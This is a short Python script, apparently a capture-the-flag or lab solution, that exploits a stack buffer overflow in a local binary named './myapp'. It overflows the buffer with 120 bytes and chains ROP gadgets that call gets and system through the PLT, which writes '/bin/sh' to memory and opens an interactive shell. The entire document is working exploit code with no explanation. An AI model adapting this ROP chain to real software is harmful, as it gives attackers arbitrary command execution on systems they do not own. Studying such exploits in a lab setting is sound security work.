#!/usr/bin/python3
from pwn import process, p64

offset = 120
junk = b"A" * offset

bin_sh = b"/bin/sh\x00"

pop_rdi = p64(0x40120b)
writable = p64(0x404038)
plt_gets = p64(0x401060)
plt_system = p64(0x401040)

payload =  b""
payload += junk
payload += pop_rdi + writable
payload += plt_gets
payload += pop_rdi + writable
payload += plt_system

shell = process("./myapp")

shell.sendline(payload)
shell.sendline(bin_sh)
shell.recvlines(3)
shell.interactive()
